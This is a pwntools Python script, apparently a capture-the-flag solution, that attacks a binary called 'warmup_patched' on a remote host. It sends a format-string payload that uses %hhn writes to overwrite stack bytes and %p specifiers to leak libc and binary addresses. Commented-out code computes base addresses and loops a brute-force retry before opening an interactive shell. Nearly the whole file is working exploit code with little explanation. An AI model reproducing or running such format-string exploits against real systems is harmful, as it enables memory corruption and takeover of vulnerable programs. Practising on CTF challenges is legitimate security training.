#!/usr/bin/env python3
from pwn import *

context.terminal = ['cmd.exe', '/c', 'start', 'wsl.exe', '-d', 'Debian', 'bash', '-c']
context.arch = 'amd64'
host = '34.171.160.79'
port = 9998
elf_name = './warmup_patched'
elf = ELF(elf_name)
libc = ELF('./libc-2.23.so')
script = '''
breakrva 0x000000000000D30
breakrva 0x0000000000011D4
c
'''
# script += 'c\n'
if args.LOCAL:
    p = process(elf_name)
elif args.GDB:
    p = process(elf_name)
    gdb.attach(p, gdbscript=script)
else:
    p = remote(host, port)

# while(1):
p.sendlineafter(b'How much money you want? ', b'123123')
# offset 20 -> 0x18
# offset 26 -> 0x39

# payload = f'nnnn%20$hhn'.encode()           # brute 1 nibble
# payload = f'nnnnn%26$hhn'.encode()  
payload = b'%c'*18 + f'%{0x18-18}c'.encode() + f'%20$hhn'.encode()
payload += f'%{0x39 - 0x18}c%26$hhn'.encode()
payload += b'zzzz'
payload += b'%p%6$p%20$p%26$p'

p.sendlineafter(b'Player name: ', payload)
# p.recvuntil(b'zzzz')
# recv = p.recvline()
# libc_base = int(recv[:14], 16) - 0xf73c0
# log.info("leak libc " + hex(libc_base))
# bin_base = int(recv[14:14+14], 16) - 0x1280
# log.info("bin libc " + hex(bin_base))

# p.sendlineafter(b'Your vote (= 0 to exit): ', b'0')
# p.sendlineafter(b'Send to author your feeback: ', b'tuyendeptrai')

# try:
    #     recv = p.recvline()
    #     print(recv)
    #     if b'How much' in recv:
    #         break
    # except:
    #     p.close()
    #     log.info("fail")
    #     continue
    

p.interactive()